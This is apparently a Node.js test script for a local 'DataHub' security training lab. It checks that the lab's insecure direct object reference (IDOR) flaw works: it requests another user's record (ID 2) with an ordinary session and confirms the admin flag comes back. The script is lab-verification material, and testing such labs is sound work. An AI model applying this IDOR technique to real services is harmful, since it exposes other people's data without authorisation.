const http = require('http');

const BASE_URL = 'http://localhost:3000';

async function request(method, path, data = null, headers = {}) {
    return new Promise((resolve, reject) => {
        const url = new URL(path, BASE_URL);
        const options = {
            method,
            hostname: url.hostname,
            port: url.port,
            path: url.pathname + url.search,
            headers: {
                ...headers
            }
        };

        if (data) {
            const body = new URLSearchParams(data).toString();
            options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            options.headers['Content-Length'] = Buffer.byteLength(body);
        }

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => resolve({ statusCode: res.statusCode, headers: res.headers, body }));
        });

        req.on('error', reject);

        if (data) {
            req.write(new URLSearchParams(data).toString());
        }
        req.end();
    });
}

async function runTest() {
    try {
        console.log('Testing DataHub lab...');
        
        await request('POST', '/labs/datahub/reset');
        
        // Setup: Get initial page to get session cookie
        console.log('[+] Getting session...');
        const homeRes = await request('GET', '/labs/datahub/');
        const setCookie = homeRes.headers['set-cookie'];
        console.log("Set-Cookie Header:", setCookie);
        if (!setCookie) {
            throw new Error('Failed to get session cookie');
        }
        
        let cookieStr = '';
        for (const c of setCookie) {
            if (c.startsWith('session_id=')) {
                cookieStr = c.split(';')[0];
            }
        }
        if (!cookieStr) {
            // fallback
            cookieStr = setCookie[0].split(';')[0];
        }
        
        // 1. Normal user workflow
        console.log('[+] Normal user requesting data (ID=1)...');
        const normalRes = await request('GET', '/labs/datahub/api/data/1', null, { 'Cookie': cookieStr });
        if (normalRes.statusCode !== 200 || !normalRes.body.includes('Normal User')) {
            console.log("Normal Res:", normalRes);
            throw new Error('Normal user data fetch failed');
        }
        console.log('[+] Normal user data fetched.');

        // 2. Exploit workflow: IDOR
        console.log('[+] Exploiting IDOR: Requesting data for ID=2...');
        const exploitRes = await request('GET', '/labs/datahub/api/data/2', null, { 'Cookie': cookieStr });

        if (exploitRes.statusCode !== 200 || !exploitRes.body.includes('DataHubPwned')) {
            throw new Error('Exploit failed, admin data not returned');
        }

        console.log('[+] Admin data accessed. Checking lab completion status...');
        
        // 3. Verify completion
        const checkRes = await request('GET', '/labs/datahub/', null, { 'Cookie': cookieStr });
        if (checkRes.body.includes('DataHubPwned')) {
            console.log('[+] Lab completed successfully! Flag found.');
        } else {
            throw new Error('Exploit failed, flag not found in home response');
        }

        console.log('DataHub tests passed.');
    } catch (e) {
        console.error('DataHub test failed:', e);
        process.exit(1);
    }
}

runTest();
